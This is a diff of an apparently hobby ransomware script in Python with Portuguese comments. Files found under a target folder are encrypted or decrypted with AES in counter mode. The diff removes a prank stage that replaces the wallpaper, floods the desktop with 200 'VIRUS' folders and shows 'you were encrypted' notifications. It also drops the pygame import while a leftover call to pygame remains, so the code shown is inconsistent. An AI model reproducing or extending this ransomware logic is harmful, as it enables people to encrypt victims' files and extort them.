@@ -1,6 +1,3 @@
-#Lib para criar notificações no windows
-from win10toast import ToastNotifier
-
 #Lib para Cifrar dados e criptografar
 from Crypto.Util import Counter
 from Crypto.Cipher import AES
@@ -9,9 +6,6 @@ import ctypes
 
 #Criar token com quantidades
 import secrets
-
-#Tocar musica
-import pygame
 
 #Módulo de decobrir arquivos
 import Discovery
@@ -50,6 +44,7 @@ def main():
         ''')
         
         key = input('Digite a senha > ')
+
     else:
         if HARDCODED_KEY:
             key = HARDCODED_KEY
@@ -63,39 +58,20 @@ def main():
     else:
         cryptFN = crypt.decrypt
 
+
     init_path = os.path.abspath(os.path.join(os.getcwd(), 'teste'))
     starDirs = [init_path]
+
 
     for currentDir in starDirs:
         for filename in Discovery.discoverFile(currentDir):
             Crypter.changeFiles(filename, cryptFN)
 
 
-
     #Limpando a chave de criptografia da memória
 
     for i in range(100):
         pass
-
-
-    #Zoação no desktop
-
-    if not decrypt:
-        SPI_SETDESKWALLPAPER = 20
-        # Definir o caminho do arquivo de imagem
-        image_path = os.path.join(os.getcwd(), 'img', 'wallpaper.jpg')
-        # Chamando a função de API do Windows para definir o papel de parede
-        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 0)
-
-        desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
-        for i in range(1, 201):
-            folder_name = f"VIRUS 🦠 {i}"
-            folder_path = os.path.join(desktop_path, folder_name)
-            os.makedirs(folder_path)
-            toaster = ToastNotifier()
-            toaster.show_toast("Castpy Tech", "Você foi criptografado", duration=0.2)
-
-
 
 if __name__ == '__main__':
     pygame.mixer.init()
